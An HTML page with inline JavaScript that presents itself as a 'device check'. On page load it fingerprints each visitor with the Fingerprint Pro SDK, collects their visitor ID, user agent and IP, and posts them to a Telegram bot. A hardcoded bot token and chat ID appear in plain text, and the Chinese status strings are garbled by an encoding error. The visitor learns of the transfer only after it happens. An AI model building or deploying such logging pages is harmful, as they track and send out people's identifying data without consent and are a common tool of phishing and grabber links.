<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Fingerprint Pro + Telegram Push</title>
</head>
<body>
  <h2>Fingerprint Pro Device Check & Telegram Push</h2>
  <pre id="output">æ­£åœ¨æ£€æµ‹ä¸­ï¼Œè¯·ç¨å€™...</pre>

  <script>
    const BOT_TOKEN = '7658247656:AAErdePgM1SQ5RhJBeIOQCdLyNhrsc6ZFAQ';
    const CHAT_ID = '7305624337';
    const outputEl = document.getElementById('output');

    async function sendTelegramMessage(text) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const params = {
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'Markdown'
      };
      try {
        const resp = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(params),
        });
        if (!resp.ok) throw new Error('Telegram API è¯·æ±‚å¤±è´¥');
        return await resp.json();
      } catch (err) {
        console.error('å‘é€åˆ° Telegram å¤±è´¥:', err);
        outputEl.textContent += '\nå‘é€ Telegram å¤±è´¥: ' + err.message;
      }
    }

    async function runFingerprint() {
      outputEl.textContent = 'åŠ è½½ Fingerprint Pro SDK...';
      const FingerprintJS = await import('https://fpjscdn.net/v3/k88Qqpi0mqB3GklSIlqg');
      const fp = await FingerprintJS.load();

      outputEl.textContent = 'å¼€å§‹æ£€æµ‹è®¾å¤‡æŒ‡çº¹...';
      const result = await fp.get();

      const info = {
        visitorId: result.visitorId,
        userAgent: navigator.userAgent,
        ip: result.ip ?? 'æœªçŸ¥',
        confidenceScore: result.confidenceScore ?? 'æ— ',
        suspectScore: result.suspectScore ?? 'æ— ',
        rawResult: result
      };

      let msg = `ğŸ“± *è®¾å¤‡æŒ‡çº¹æ£€æµ‹ç»“æœ*\n`;
      msg += `Visitor ID: \`${info.visitorId}\`\n`;
      msg += `User Agent: \`${info.userAgent}\`\n`;
      msg += `IP: \`${info.ip}\`\n`;
      msg += `Confidence Score: \`${info.confidenceScore}\`\n`;
      msg += `Suspect Score: \`${info.suspectScore}\`\n`;

      outputEl.textContent = JSON.stringify(result, null, 2);
      await sendTelegramMessage(msg);
      outputEl.textContent += '\n\nç»“æœå·²å‘é€åˆ° Telegram æœºå™¨äººï¼';
    }

    runFingerprint();
  </script>
</body>
</html>
